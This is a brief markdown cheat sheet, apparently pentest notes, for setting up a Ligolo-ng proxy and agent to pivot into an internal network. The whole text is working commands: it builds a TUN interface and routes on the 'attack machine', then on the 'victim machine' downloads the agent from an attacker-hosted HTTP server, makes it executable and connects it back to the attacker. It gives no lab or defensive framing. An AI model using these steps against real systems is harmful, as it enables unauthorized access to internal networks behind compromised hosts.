# Ligolo proxy setup
 
----------------------------------------------------------------------------------------------------------------------------

First of all we need to download 2 executables;
	1. Ligolo Agent
	2. Ligolo Proxy

Proxy Download
```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```
Agent Download
```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```

----------------------------------------------------------------------------------------------------------------------------

# In our Attack Machine

Change the user 'root' as your own user
```bash
sudo ip tuntap add user root mode tun ligolo
```

Next if you use any vpn address to connect with, delete the internal ip range which you want to connect
```bash
sudo ip route del 192.168.98.0/24 dev tun0
```

Setup the Ligolo tunnel and add the range which you want to connect
```bash
sudo ip link set ligolo up

sudo ip route add 192.168.98.0/24 dev ligolo
```

Start your Ligolo Proxy
```bash
./proxy -selfcert -laddr 0.0.0.0:443
```

----------------------------------------------------------------------------------------------------------------------------

# In the Victim machine

Download the Ligolo agent to victim machine and start it (Do not forget to set up the python http.server in your attacker machine 'python3 -m http.server')
```bash
wget http://attacker_machine_ip_address:8000/agent /opt/

chmod +x agent

./agent -connect attacker_machine_ip_address -ignore-cert
```

----------------------------------------------------------------------------------------------------------------------------

# Again in our Attacker machine
In the ligolo menu
```bash
session

start
```

Now we can easily access to the internal network which we wanted to connect